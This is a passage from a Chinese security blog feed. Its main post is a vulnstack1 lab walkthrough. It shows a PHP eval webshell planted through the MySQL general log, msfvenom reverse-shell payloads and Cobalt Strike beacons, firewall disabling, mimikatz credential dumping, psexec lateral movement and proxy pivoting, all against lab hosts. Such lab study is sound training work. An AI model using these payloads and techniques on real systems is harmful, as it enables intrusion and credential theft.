<p>当时只想到了刚才问的sleep函数的替代函数….别的都想不起来了，大脑一片空白…….</p>
<br>

<hr>
<p>感觉应该是凉凉了，面试挺突然的，没做啥准备，而且这个实习是比赛方面的，作为签到型选手几率更渺茫了…wuwuwu….先把红日靶场搞完，好好准备秋招了！</p>
]]></content>
      <categories>
        <category>面试</category>
      </categories>
      <tags>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title>kali配置双网卡</title>
    <url>/posts/47c05aa1/</url>
    <content><![CDATA[<br>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo  vim &#x2F;etc&#x2F;network&#x2F;interfaces</span><br><span class="line"> </span><br><span class="line">auto eth0</span><br><span class="line">iface eth0 inet static</span><br><span class="line">address 192.168.0.128</span><br><span class="line">netmask 255.255.255.0</span><br><span class="line">gateway 192.168.0.2</span><br><span class="line"></span><br><span class="line">auto eth1</span><br><span class="line">iface eth1 inet static</span><br><span class="line">address 192.168.72.130</span><br><span class="line">netmask 255.255.255.0</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F;保存后</span><br><span class="line">sudo service networking  restart     </span><br><span class="line">ifconfig</span><br><span class="line">reboot</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnstack1靶场</title>
    <url>/posts/bb76ba56/</url>
    <content><![CDATA[<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kali        VM2,NAT             192.168.72.130,192.168.0.128</span><br><span class="line">win7        VM2,VM1,NAT         192.168.52.143,192.168.72.129,192.168.0.178</span><br><span class="line">win2k3      VM1                 192.168.52.141</span><br><span class="line">winServer08 VM1                 192.168.52.138</span><br></pre></td></tr></table></figure>

<p>通用密码为 <code>hongrisec@2019</code> 更改后的密码为<code>hongrisec@2021</code></p>
<p>win7可以ping通所有主机，但所有主机都无法ping通win7(win7防火墙过滤了icmp,开启文件和打印机回显 imcpv4即可ping通)</p>
<p>win2003与win2008互通</p>
<p>(之前选择win7网络是选成了家庭网络导致无法在其他主机访问web服务，改为公用网络就i好了;使用VM1和Nat模式的win7域配置有点问题，然后就在后面内网渗透的时候重新设置了，给kali和win7配置了VM2网卡)</p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p><code>nmap 192.168.0.178 -sS -Pn</code> </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-07-13 20:31 CST</span><br><span class="line">Nmap scan report for 192.168.0.178</span><br><span class="line">Host is up (0.00052s latency).</span><br><span class="line">Not shown: 998 filtered ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">80&#x2F;tcp   open  http</span><br><span class="line">3306&#x2F;tcp open  mysql</span><br><span class="line">MAC Address: 00:0C:29:63:00:E0 (VMware)</span><br></pre></td></tr></table></figure>

<p>开放了80端口 和 3306端口</p>
<p>访问80端口，默认页面为phpstudy探针，得到网站绝对路径为<code>C:/phpStudy/WWW </code> 还有一个mysql数据库连接检测，输入root,root 显示成功连接数据库,可以确定得到数据库账号密码为 <code>root</code>  <code>root</code></p>
<h4 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h4><p><code>sudo dirb http://192.168.0.178</code>  dirmap只扫描出了phpmyadmin</p>
<p><code>sudo python3 dirsearch.py -u http://192.168.0.178 -e */</code> dirsearch也只扫出来了phpmyadmin</p>
<p><code>sudo python3 dirmap.py  -i 192.168.0.178 -lcf</code> 使用dirmap 扫到了备份文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[200][application&#x2F;x-rar-compressed][3.00mb] http:&#x2F;&#x2F;192.168.0.178&#x2F;beifen.rar         </span><br><span class="line">[200][text&#x2F;html][70.39kb] http:&#x2F;&#x2F;192.168.0.178&#x2F;phpinfo.php                          </span><br><span class="line">[200][text&#x2F;html; charset&#x3D;utf-8][4.28kb] http:&#x2F;&#x2F;192.168.0.178&#x2F;phpMyAdmin&#x2F;            </span><br><span class="line">[200][text&#x2F;html; charset&#x3D;utf-8][4.28kb] http:&#x2F;&#x2F;192.168.0.178&#x2F;phpMyadmin&#x2F;            </span><br><span class="line">[200][text&#x2F;html; charset&#x3D;utf-8][4.28kb] http:&#x2F;&#x2F;192.168.0.178&#x2F;phpmyadmin&#x2F;            </span><br><span class="line">[200][text&#x2F;html; charset&#x3D;utf-8][4.28kb] http:&#x2F;&#x2F;192.168.0.178&#x2F;phpmyAdmin&#x2F;            </span><br><span class="line">[200][text&#x2F;html; charset&#x3D;utf-8][14.39kb] http:&#x2F;&#x2F;192.168.0.178&#x2F;&#x2F;l.php  </span><br></pre></td></tr></table></figure>

<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="后台上传shell"><a href="#后台上传shell" class="headerlink" title="后台上传shell"></a>后台上传shell</h4><p>下载备份文件，发现为yxcms</p>
<p>访问 <code>192.168.0.178/yxcms</code>,主页中有敏感信息泄漏</p>
<p><img src="/posts/bb76ba56/info.png"></p>
<p>得到后台地址和登录账号</p>
<p>在前台模板处，可以新增php文件,创建一个shell1.php</p>
<p><img src="/posts/bb76ba56/shell1php.png"></p>
<p>通过之前下载的备份文件找一下shell1.php的文件路径</p>
<p><img src="/posts/bb76ba56/sehll1dir.png"></p>
<p>找到shell的文件路径为<code>yxcms/protected/apps/default/view/default/</code></p>
<p>访问<code>http://192.168.0.178/yxcms/protected/apps/default/view/default/shell1.php?cmd=phpinfo();</code>成功上传shell</p>
<p><img src="/posts/bb76ba56/shell_phpinfo.png"></p>
<p>使用蚁剑连接shell</p>
<p><img src="/posts/bb76ba56/ant_shell.png"></p>
<h4 id="phpmyadmin利用日志Getshell"><a href="#phpmyadmin利用日志Getshell" class="headerlink" title="phpmyadmin利用日志Getshell"></a>phpmyadmin利用日志Getshell</h4><p>弱口令<code>root</code>  <code>root</code>成功登录</p>
<p>查看是否有写入权限 <code>show variables like &#39;%secure_file%&#39;;</code></p>
<p>secure_file_priv 值为 NULL，不能使用 into outfile 方式写入 shell</p>
<p><img src="/posts/bb76ba56/phpmy1.png"></p>
<p>手动开启日志记录</p>
<p><img src="/posts/bb76ba56/phpmy2.png"></p>
<p>查看当前日志目录</p>
<p><img src="/posts/bb76ba56/phpmy3.png"></p>
<p>指定日志文件</p>
<p><code>set global general_log_file = &quot;C:/phpStudy/www/1.php&quot;;</code></p>
<p>再次查看日志目录</p>
<p><code>show variables like &#39;general%&#39;;</code></p>
<p><img src="/posts/bb76ba56/phpmy4.PNG"></p>
<p>将一句话木马写入指定的1.php</p>
<p><code>SELECT &#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39;</code></p>
<p><img src="/posts/bb76ba56/phpmy5.PNG"></p>
<p><img src="/posts/bb76ba56/phpmy6.PNG"></p>
<h3 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h3><h4 id="使用msf"><a href="#使用msf" class="headerlink" title="使用msf"></a>使用msf</h4><p>打开msf进行本机监听</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.72.130</span><br><span class="line">set lport 9999</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>使用msfvenom生成shell.exe</p>
<p><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.72.130 lport=9999 -f exe -o shell.exe</code></p>
<p>然后使用蚁剑上传shell.exe后执行</p>
<p>成功在msf上收到反弹shell</p>
<p><img src="/posts/bb76ba56/msf_shell.png"></p>
<p><code>getuid</code>查看当前权限</p>
<p>使用<code>getsystem</code>成功提权</p>
<p><img src="/posts/bb76ba56/msf_getsystem.png"></p>
<p>使用<code>sysinfo</code>查看系统信息</p>
<p><img src="/posts/bb76ba56/msf_sysinfo.png"></p>
<p>使用<code>ps</code>查看系统进程,找一个x64的进程，用户为<code>NT AUTHORITY\SYSTEM</code>,这样迁移后meterpreter的权限是迁移到的进程的权限，在此次选择使用id为400的进程进行迁移</p>
<p><img src="/posts/bb76ba56/msf_ps.png"></p>
<p><img src="/posts/bb76ba56/msf_migrate400.png"></p>
<p>使用<code>getpid</code> 查看当前Meterpreter Shell的进程PID</p>
<p>加载mimikatz模块<code>load mimikatz</code></p>
<p><img src="/posts/bb76ba56/msf_loadmimikatz_error.png"></p>
<p>根据提示，mimikatz模块已经被kiwi所取代</p>
<p>使用<code>help kiwi</code>可以查看帮助</p>
<p>在使用wiki的时候需要先迁移进程不然会无法正常运行</p>
<p><img src="/posts/bb76ba56/msf_kiwi_nomigrate.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">help kiwi</span><br><span class="line"></span><br><span class="line">creds_all：列举所有凭据</span><br><span class="line">creds_kerberos：列举所有kerberos凭据</span><br><span class="line">creds_msv：列举所有msv凭据</span><br><span class="line">creds_ssp：列举所有ssp凭据</span><br><span class="line">creds_tspkg：列举所有tspkg凭据</span><br><span class="line">creds_wdigest：列举所有wdigest凭据</span><br><span class="line">dcsync：通过DCSync检索用户帐户信息</span><br><span class="line">dcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RID</span><br><span class="line">golden_ticket_create：创建黄金票据</span><br><span class="line">kerberos_ticket_list：列举kerberos票据</span><br><span class="line">kerberos_ticket_purge：清除kerberos票据</span><br><span class="line">kerberos_ticket_use：使用kerberos票据</span><br><span class="line">kiwi_cmd：执行mimikatz的命令，后面接mimikatz.exe的命令</span><br><span class="line">lsa_dump_sam：dump出lsa的SAM</span><br><span class="line">lsa_dump_secrets：dump出lsa的密文</span><br><span class="line">password_change：修改密码</span><br><span class="line">wifi_list：列出当前用户的wifi配置文件</span><br><span class="line">wifi_list_shared：列出共享wifi配置文件&#x2F;编码</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>使用<code>creds_all</code> 命令直接获取密码</p>
<p><img src="/posts/bb76ba56/msf_kiwi_creds_all.png"></p>
<p>使用<code>kiwi_cmd</code>后面接mimikatz.exe的命令</p>
<p><code>kiwi_cmd sekurlsa::logonpasswords</code>可以得到密码<code>hongrisec@2021</code></p>
<p><img src="/posts/bb76ba56/msf_kiwi_cmd.png"></p>
<p>进入shell <code>netstat -ano | findstr &quot;3389&quot;</code>查看3389端口是否开放，shell突然没了相应…然后发现靶机ip自动变了..</p>
<p>使用msf开启3389端口</p>
<p>meterpreter &gt;<code> run post/windows/manage/enable_rdp</code></p>
<p><img src="/posts/bb76ba56/msf_run_rdp.png"></p>
<p>(注：运行完该命令后突然发现连接不上shell了，去靶机看了下 网卡开启的自动获取ip，打开3389之后不知道为什么就自己换了ip，然后就在靶机上设置了固定ip 为 <code>192.168.72.136</code>)</p>
<p>然后再kali上尝试远程连接靶机</p>
<p><code>sudo rdesktop 192.168.72.136</code> 输入yes</p>
<p>使用<code>God\Administrator </code> <code>hongrisec@2021</code>成功登录</p>
<p><img src="/posts/bb76ba56/msf_rdesktop.png"></p>
<hr>
<h4 id="使用CS连接"><a href="#使用CS连接" class="headerlink" title="使用CS连接"></a>使用CS连接</h4><p>在CS中创建beacon http监听，</p>
<p>然后选择攻击-&gt;生产后门-&gt;Windows Executable(s),选择刚才创建的Listener生成1.exe</p>
<br>

<p>在蚁剑中关闭防火墙</p>
<p><code>netsh advfirewall set allprofiles state off</code></p>
<p>将生成的exe在蚁剑终端运行</p>
<p>在Cobalt Strike中它的心跳默认是60s(即sleep时间为60s，每一分钟目标主机与teamserver通信一次), 这会让执行命令或进行其他操作响应很慢</p>
<p><code>sleep 5</code> 设置时间为5s，如果设置值过小，流量会很明显 。</p>
<h5 id="系统信息收集"><a href="#系统信息收集" class="headerlink" title="系统信息收集"></a>系统信息收集</h5><p><code>shell whoami</code></p>
<p><code>shell net user</code></p>
<p><img src="/posts/bb76ba56/wininfo1.png"></p>
<p><code>shell net user /domain</code></p>
<p><img src="/posts/bb76ba56/shell_net_user_domain.png"></p>
<p><code>shell ipconfig /all</code></p>
<p><img src="/posts/bb76ba56/wininfo2.PNG"></p>
<p><img src="/posts/bb76ba56/wininfo3.PNG"></p>
<p><code>shell systeminfo </code></p>
<p><img src="/posts/bb76ba56/cs_shellsysteminfo.png"></p>
<p><img src="/posts/bb76ba56/cs_shellsysteminfo2.PNG"></p>
<p><code>shell net view</code></p>
<blockquote>
<p>net view 命令出现6118错误解决方法:关闭防火墙</p>
<p>netsh advfirewall set allprofiles state off</p>
</blockquote>
<p><img src="/posts/bb76ba56/cs_shellnetview.png"></p>
<p>查看主域信息 <code>shell net view /domain</code></p>
<p><img src="/posts/bb76ba56/cs_netview_domain.png"></p>
<p>查看时间 <code>net time /domain</code></p>
<p><img src="/posts/bb76ba56/net_view_time_domain.png"></p>
<p>查询当前的登录域与用户信息<code>net config workstation</code></p>
<p><img src="/posts/bb76ba56/net_config_workstation.png"></p>
<p>执行CS中的<code>net view</code></p>
<p><img src="/posts/bb76ba56/cs_netview.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">域: god.org</span><br><span class="line">域内主机: OWA   192.168.52.138</span><br><span class="line">          ROOT-TVI862UBEH   192.168.52.141</span><br><span class="line">          STU1(win7)  192.168.52.143</span><br><span class="line">域内用户: Administrator</span><br><span class="line">          ligang</span><br><span class="line">          liukaifeng01</span><br><span class="line">域控: OWA 192.168.52.138</span><br></pre></td></tr></table></figure>

<h5 id="系统密码收集"><a href="#系统密码收集" class="headerlink" title="系统密码收集"></a>系统密码收集</h5><p>在CS中使用<code>hashdump</code>   <code>logonpasswords</code>  读取内存和密码</p>
<p><img src="/posts/bb76ba56/password1.png"></p>
<p>得到hash值和明文密码，密码为 <code>hongrisec@2021</code></p>
<p>也可以使用CS中的<code>Run mimikatz</code></p>
<p><img src="/posts/bb76ba56/run_mimikatz.png"></p>
<p>抓到的结果可以在<code>View -&gt;  Credentials</code>中查看</p>
<p><img src="/posts/bb76ba56/Credentials.png"></p>
<br>

<h5 id="横向探测"><a href="#横向探测" class="headerlink" title="横向探测"></a>横向探测</h5><p>使用CS中的<code>net view</code>和<code>port scan</code> 功能</p>
<p><img src="/posts/bb76ba56/cs_netview.png"></p>
<p><img src="/posts/bb76ba56/cs_portscan.png"></p>
<p>扫描出来的内容可以在target中看到</p>
<p><img src="/posts/bb76ba56/cs_target.png"></p>
<h6 id="使用CS的psexec"><a href="#使用CS的psexec" class="headerlink" title="使用CS的psexec"></a>使用CS的psexec</h6><p>1.先创建一个smb beacon</p>
<p><img src="/posts/bb76ba56/cs_new_smbbeacon.png"></p>
<p>2.在已有的Beacon上右键选择Spawnm，选择smb beacon的listener</p>
<p><img src="/posts/bb76ba56/cs_smb.png"></p>
<p>然后后生成派生的smb beacon</p>
<p><img src="/posts/bb76ba56/cs_psexec1.png"></p>
<p><img src="/posts/bb76ba56/cs_psexec2.PNG"></p>
<p>3.使用凭证连接其他内网机器</p>
<p>在Targets中 选择主机右键<code>jump</code>-&gt; <code>psexec</code></p>
<p><img src="/posts/bb76ba56/cs_psexec3.PNG"></p>
<p><img src="/posts/bb76ba56/cs_psexec4.PNG"></p>
<p>成功用此方法连接到OWA的beacon</p>
<p>但是在连接 ROOT-TVI862UBEH时，会报错，具体原因还没找到….求解决</p>
<p><img src="/posts/bb76ba56/cs_psexec_error.png"></p>
<p>4.当然也可以通过窃取GOD\Administrator的token来登录其他主机</p>
<p>选择beacon右键-&gt;Explore-&gt;Process List-&gt;找到GOD\Administrator的进程 点击右下角的<code>steal token</code></p>
<p>然后进入targets-&gt;jump-&gt;psexec-&gt;勾选左下方的勾 使用当前会话的token，这种方法和前面的效果相同</p>
<br>

<h5 id="CS派生msf会话"><a href="#CS派生msf会话" class="headerlink" title="CS派生msf会话"></a>CS派生msf会话</h5><p>在CS中创建一给Foreign HTTP(s)</p>
<p><img src="/posts/bb76ba56/cs_msf1.png"> </p>
<p>在msf中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf &gt; use exploit&#x2F;multi&#x2F;handler </span><br><span class="line">msf exploit(multi&#x2F;handler) &gt; set set payload windows&#x2F;meterpreter&#x2F;reverse_http</span><br><span class="line">set &#x3D;&gt; payload windows&#x2F;meterpreter&#x2F;reverse_http</span><br><span class="line">msf6 exploit(multi&#x2F;handler) &gt; set lhost 192.168.72.130</span><br><span class="line">lhost &#x3D;&gt; 192.168.72.130</span><br><span class="line">msf6 exploit(multi&#x2F;handler) &gt; set lport 2222</span><br><span class="line">lport &#x3D;&gt; 2222</span><br><span class="line">msf6 exploit(multi&#x2F;handler) &gt; run</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/posts/bb76ba56/cs_msf2.png"></p>
<br>

<p>使用<code>run autoroute -s 192.168.72.0/24</code>报错 应该是在msf6中移除了</p>
<p><code>use post/multi/manage/autoroute</code> 选择autoroute模块添加路由</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf6 post(multi&#x2F;manage&#x2F;autoroute) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (post&#x2F;multi&#x2F;manage&#x2F;autoroute):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   CMD      autoadd          yes       Specify the autoroute command (Accepted: add</span><br><span class="line">                                       , autoadd, print, delete, default)</span><br><span class="line">   NETMASK  255.255.255.0    no        Netmask (IPv4 as &quot;255.255.255.0&quot; or CIDR as</span><br><span class="line">                                       &quot;&#x2F;24&quot;</span><br><span class="line">   SESSION                   yes       The session to run this module on.</span><br><span class="line">   SUBNET                    no        Subnet (IPv4, for example, 10.10.10.0)</span><br><span class="line"></span><br><span class="line">msf6 post(multi&#x2F;manage&#x2F;autoroute) &gt; set session 10</span><br><span class="line">session &#x3D;&gt; 10</span><br><span class="line">msf6 post(multi&#x2F;manage&#x2F;autoroute) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (post&#x2F;multi&#x2F;manage&#x2F;autoroute):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   CMD      autoadd          yes       Specify the autoroute command (Accepted: add</span><br><span class="line">                                       , autoadd, print, delete, default)</span><br><span class="line">   NETMASK  255.255.255.0    no        Netmask (IPv4 as &quot;255.255.255.0&quot; or CIDR as</span><br><span class="line">                                       &quot;&#x2F;24&quot;</span><br><span class="line">   SESSION  10               yes       The session to run this module on.</span><br><span class="line">   SUBNET                    no        Subnet (IPv4, for example, 10.10.10.0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 post(multi&#x2F;manage&#x2F;autoroute) &gt; set subnet 192.168.52.0&#x2F;24</span><br><span class="line">subnet &#x3D;&gt; 192.168.52.0&#x2F;24</span><br><span class="line">msf6 post(multi&#x2F;manage&#x2F;autoroute) &gt; run</span><br><span class="line"></span><br><span class="line">[!] SESSION may not be compatible with this module (incompatible session platform: windows)</span><br><span class="line">[*] Running module against STU1</span><br><span class="line">[*] Searching for subnets to autoroute.</span><br><span class="line"></span><br><span class="line">[+] Route added to subnet 169.254.0.0&#x2F;255.255.0.0 from host&#39;s routing table.</span><br><span class="line">[+] Route added to subnet 192.168.52.0&#x2F;255.255.255.0 from host&#39;s routing table.</span><br><span class="line">[+] Route added to subnet 192.168.72.0&#x2F;255.255.255.0 from host&#39;s routing table.</span><br><span class="line">[*] Post module execution completed</span><br><span class="line"></span><br><span class="line">msf6 post(multi&#x2F;manage&#x2F;autoroute) &gt; route print</span><br><span class="line"></span><br><span class="line">IPv4 Active Routing Table</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">   Subnet             Netmask            Gateway</span><br><span class="line">   ------             -------            -------</span><br><span class="line">   169.254.0.0        255.255.0.0        Session 10</span><br><span class="line">   192.168.52.0       255.255.255.0      Session 10</span><br><span class="line">   192.168.72.0       255.255.255.0      Session 10</span><br><span class="line"></span><br><span class="line">[*] There are currently no IPv6 routes defined.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>设置代理</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf6 post(multi&#x2F;manage&#x2F;autoroute) &gt; use auxiliary&#x2F;server&#x2F;socks_proxy</span><br><span class="line">msf6 auxiliary(server&#x2F;socks_proxy) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary&#x2F;server&#x2F;socks_proxy):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   PASSWORD                   no        Proxy password for SOCKS5 listener</span><br><span class="line">   SRVHOST   0.0.0.0          yes       The address to listen on</span><br><span class="line">   SRVPORT   1080             yes       The port to listen on</span><br><span class="line">   USERNAME                   no        Proxy username for SOCKS5 listener</span><br><span class="line">   VERSION   5                yes       The SOCKS version to use (Accepted: 4a, 5)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Auxiliary action:</span><br><span class="line"></span><br><span class="line">   Name   Description</span><br><span class="line">   ----   -----------</span><br><span class="line">   Proxy  Run a SOCKS proxy server</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 auxiliary(server&#x2F;socks_proxy) &gt; set version 5</span><br><span class="line">version &#x3D;&gt; 5</span><br><span class="line">msf6 auxiliary(server&#x2F;socks_proxy) &gt; run</span><br><span class="line">[*] Auxiliary module running as background job 0.</span><br><span class="line">msf6 auxiliary(server&#x2F;socks_proxy) &gt; </span><br><span class="line">[*] Starting the SOCKS proxy server</span><br><span class="line">Interrupt: use the &#39;exit&#39; command to quit</span><br><span class="line">msf6 auxiliary(server&#x2F;socks_proxy) &gt; run</span><br><span class="line">[*] Auxiliary module running as background job 1.</span><br><span class="line"></span><br><span class="line">[*] Starting the SOCKS proxy server</span><br><span class="line">[*] Stopping the SOCKS proxy server</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>配置proxychains4</p>
<p><code>sudo vim /etc/proxychains4.conf</code></p>
<p>添加 <code>socks5 127.0.0.1 1080</code></p>
<p>测试是否可以去访问内网</p>
<p><code>proxychains4 curl http://192.168.52.143/</code> 成功访问到</p>
<p><img src="/posts/bb76ba56/proxy.png"></p>
<p>使用代理访问内网中192.168.52.141的机器</p>
<p><code>proxychains4 nmap -Pn -sT 192.168.52.141</code>nmap扫描一下端口，扫了很长时间……</p>
<p><img src="/posts/bb76ba56/nmap_output.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Nmap scan report for 192.168.52.141</span><br><span class="line">Host is up (1.5s latency).</span><br><span class="line">Not shown: 987 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">21&#x2F;tcp   open  ftp</span><br><span class="line">135&#x2F;tcp  open  msrpc</span><br><span class="line">139&#x2F;tcp  open  netbios-ssn</span><br><span class="line">445&#x2F;tcp  open  microsoft-ds</span><br><span class="line">777&#x2F;tcp  open  multiling-http</span><br><span class="line">1025&#x2F;tcp open  NFS-or-IIS</span><br><span class="line">1028&#x2F;tcp open  unknown</span><br><span class="line">1029&#x2F;tcp open  ms-lsa</span><br><span class="line">1030&#x2F;tcp open  iad1</span><br><span class="line">6002&#x2F;tcp open  X11:2</span><br><span class="line">7001&#x2F;tcp open  afs3-callback</span><br><span class="line">7002&#x2F;tcp open  afs3-prserver</span><br><span class="line">8099&#x2F;tcp open  unknown</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>也可以使用msf中的<code>auxiliary/scanner/portscan/tcp</code>跑一下开放端口</p>
<p><img src="/posts/bb76ba56/msf_portscan_tcp.png"></p>
<p>先利用smb扫描系统版本 <code>auxiliary/scanner/smb/smb_version</code></p>
<p><img src="/posts/bb76ba56/msf_smb.png"></p>
<p><img src="/posts/bb76ba56/msf_smb2.png"></p>
<p><img src="/posts/bb76ba56/msf_smb3.png"></p>
<p>使用msf扫描模块检测是否存在ms17-010漏洞</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf6 auxiliary(server&#x2F;socks_proxy) &gt; use &#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010</span><br><span class="line">msf6 auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010):</span><br><span class="line"></span><br><span class="line">   Name         Current Setting        Required  Description</span><br><span class="line">   ----         ---------------        --------  -----------</span><br><span class="line">   CHECK_ARCH   true                   no        Check for architecture on vulnerab</span><br><span class="line">                                                 le hosts</span><br><span class="line">   CHECK_DOPU   true                   no        Check for DOUBLEPULSAR on vulnerab</span><br><span class="line">                                                 le hosts</span><br><span class="line">   CHECK_PIPE   false                  no        Check for named pipe on vulnerable</span><br><span class="line">                                                  hosts</span><br><span class="line">   NAMED_PIPES  &#x2F;usr&#x2F;share&#x2F;metasploit  yes       List of named pipes to check</span><br><span class="line">                -framework&#x2F;data&#x2F;wordl</span><br><span class="line">                ists&#x2F;named_pipes.txt</span><br><span class="line">   RHOSTS       192.168.52.0&#x2F;24        yes       The target host(s), range CIDR ide</span><br><span class="line">                                                 ntifier, or hosts file with syntax</span><br><span class="line">                                                  &#39;file:&lt;path&gt;&#39;</span><br><span class="line">   RPORT        445                    yes       The SMB service port (TCP)</span><br><span class="line">   SMBDomain    .                      no        The Windows domain to use for auth</span><br><span class="line">                                                 entication</span><br><span class="line">   SMBPass                             no        The password for the specified use</span><br><span class="line">                                                 rname</span><br><span class="line">   SMBUser                             no        The username to authenticate as</span><br><span class="line">   THREADS      100                    yes       The number of concurrent threads (</span><br><span class="line">                                                 max one per host)</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; set rhosts 192.168.52.0&#x2F;24</span><br><span class="line">rhosts &#x3D;&gt; 192.168.52.0&#x2F;24</span><br><span class="line">msf6 auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; set threads 500</span><br><span class="line">threads &#x3D;&gt; 500</span><br><span class="line">msf6 auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; run</span><br><span class="line"></span><br><span class="line">[+] 192.168.52.143:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] 192.168.52.0&#x2F;24:445   - Scanned  45 of 256 hosts (17% complete)</span><br><span class="line">[*] 192.168.52.0&#x2F;24:445   - Scanned  52 of 256 hosts (20% complete)</span><br><span class="line">[*] 192.168.52.0&#x2F;24:445   - Scanned  77 of 256 hosts (30% complete)</span><br><span class="line">[*] 192.168.52.0&#x2F;24:445   - Scanned 114 of 256 hosts (44% complete)</span><br><span class="line">[*] 192.168.52.0&#x2F;24:445   - Scanned 145 of 256 hosts (56% complete)</span><br><span class="line">[*] 192.168.52.0&#x2F;24:445   - Scanned 154 of 256 hosts (60% complete)</span><br><span class="line">[-] 192.168.52.141:445    - An SMB Login Error occurred while connecting to the IPC$ tree.</span><br><span class="line">[*] 192.168.52.0&#x2F;24:445   - Scanned 190 of 256 hosts (74% complete)</span><br><span class="line">[*] 192.168.52.0&#x2F;24:445   - Scanned 205 of 256 hosts (80% complete)</span><br><span class="line">[*] 192.168.52.0&#x2F;24:445   - Scanned 255 of 256 hosts (99% complete)</span><br><span class="line">[*] 192.168.52.0&#x2F;24:445   - Scanned 256 of 256 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>使用ms17_010_command</p>
<p> <code>use auxiliary/admin/smb/ms17_010_command</code>，但是都利用失败了……</p>
<p><img src="/posts/bb76ba56/ms17_010_error.png"></p>
]]></content>
      <categories>
        <category>vulnstack</category>
      </categories>
      <tags>
        <tag>vulnstack</tag>
      </tags>
  </entry>
  <entry>
    <title>Kerberos协议分析</title>
    <url>/posts/e9f6bf8b/</url>
    <content><![CDATA[<h3 id="参与角色"><a href="#参与角色" class="headerlink" title="参与角色"></a>参与角色</h3><ul>
<li>Client</li>
<li>Server</li>
<li>KDC<ul>
<li>AD：存储所有Client的白名单，用于验证Client身份</li>
<li>AS：为Client生成TGT 服务</li>
<li>TGS：为Client生成某个服务的Ticket</li>
</ul>
</li>
</ul>
<h3 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h3><p>AS：身份认证服务，用于验证Client身份</p>
<p>KDC：密钥分发中心</p>
<p>TGT：票据中心，访问TGS的票据</p>
<p>TGS：票据授权服务</p>
<p>ST：访问Server的票据</p>
<p>SessionKey：临时会话密钥a，AS生成发送给客户端(随机密钥)</p>
<p>ServerSessionKey：临时会话密钥b，TGS生成发送给客户端(随机密钥)</p>
